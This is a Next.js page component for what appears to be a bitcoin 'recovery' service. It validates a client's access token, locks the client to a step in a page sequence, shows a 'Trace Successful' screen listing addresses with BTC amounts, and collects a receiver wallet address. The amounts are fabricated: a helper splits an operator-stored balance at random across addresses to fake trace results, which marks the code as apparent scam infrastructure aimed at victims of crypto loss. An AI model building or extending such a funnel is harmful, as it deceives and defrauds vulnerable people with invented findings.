"use client";

export const dynamic = "force-dynamic";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";
import { ShieldCheckIcon } from "@heroicons/react/24/outline";

// Helper: split balance randomly among addresses
function randomSplit(total: number, n: number): number[] {
  let splits = Array(n).fill(0);
  let remaining = total;

  for (let i = 0; i < n - 1; i++) {
    const portion = parseFloat((Math.random() * remaining * 0.7).toFixed(8));
    splits[i] = portion;
    remaining -= portion;
  }

  splits[n - 1] = parseFloat(remaining.toFixed(8));
  return splits;
}

export default function Page3() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [loading, setLoading] = useState(true);
  const [client, setClient] = useState<any>(null);
  const [addresses, setAddresses] = useState<
    { address: string; value: number }[]
  >([]);
  const [receiverWallet, setReceiverWallet] = useState("");

  /* ---------------- PAGE GUARD + DATA FETCH ---------------- */
  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    const loadClient = async () => {
      try {
        const snapshot = await getDocs(collection(db, "clients"));

        const clientDoc = snapshot.docs.find(
          (d) => d.data().accessLinkId === token
        );

        if (!clientDoc) {
          router.replace("/invalid");
          return;
        }

        const clientData = clientDoc.data();

        // 🚧 PAGE LOCK
        if (clientData.currentPage !== "page3") {
          router.replace(`/${clientData.currentPage}?token=${token}`);
          return;
        }

        setClient({ id: clientDoc.id, ...clientData });

        // 🔹 Fetch recovery addresses
        const addrCol = collection(
          db,
          "clients",
          clientDoc.id,
          "recovery_addresses"
        );
        const addrSnap = await getDocs(addrCol);

        const addrList = addrSnap.docs.map((d) => d.data().address);

        if (addrList.length === 0) {
          router.replace("/invalid");
          return;
        }

        const total = clientData.recoverableBalance || 0;
        const splitValues = randomSplit(total, addrList.length);

        setAddresses(
          addrList.map((addr, i) => ({
            address: addr,
            value: splitValues[i],
          }))
        );

        setLoading(false);
      } catch (err) {
        console.error(err);
        router.replace("/invalid");
      }
    };

    loadClient();
  }, [token, router]);

  /* ---------------- SUBMIT ---------------- */
  const handleSubmit = async () => {
    if (!receiverWallet.trim()) {
      alert("Enter receiver wallet address");
      return;
    }

    if (!client) return;

    try {
      const clientRef = doc(db, "clients", client.id);

      await updateDoc(clientRef, {
        receiver_address: receiverWallet,
        currentPage: "page4",
        pageNumber: 4,
      });

      router.replace(`/page4?token=${token}`);
    } catch (err) {
      console.error(err);
      alert("Failed to continue");
    }
  };

  /* ---------------- LOADING ---------------- */
  if (loading) {
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading recovery details...
      </main>
    );
  }

  /* ---------------- UI ---------------- */
  return (
    <main className="relative w-full h-screen overflow-hidden">
      <div className="absolute inset-0">
        <SvgStack />
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />
      </div>

      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full px-4 bg-black/85 backdrop-blur-sm">
        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
          <div className="flex flex-col items-center gap-3">
            <ShieldCheckIcon className="w-12 h-12 text-teal-400" />
            <h2 className="text-white font-bold text-xl">Trace Successful</h2>
          </div>

          <div className="bg-[#151A2E] rounded-xl p-4 space-y-2 max-h-40 overflow-y-auto">
            <h3 className="text-teal-400 font-semibold mb-2">
              Transactions Found
            </h3>

            {addresses.map((a, i) => (
              <div
                key={i}
                className="flex justify-between text-white bg-[#1A2030] rounded-lg p-2"
              >
                <span className="truncate">{a.address}</span>
                <span>{a.value.toFixed(8)} BTC</span>
              </div>
            ))}
          </div>

          <div className="text-white font-semibold">
            Recoverable Balance:{" "}
            {addresses.reduce((acc, a) => acc + a.value, 0).toFixed(8)} BTC
          </div>

          <div className="flex flex-col gap-2">
            <label className="text-gray-400 text-left">Receiver Wallet</label>
            <input
              value={receiverWallet}
              onChange={(e) => setReceiverWallet(e.target.value)}
              placeholder="Enter wallet address"
              className="w-full bg-[#151A2E] rounded-lg p-3 text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
            />
          </div>

          <button
            onClick={handleSubmit}
            className="w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
          >
            Continue
          </button>
        </div>
      </div>
    </main>
  );
}
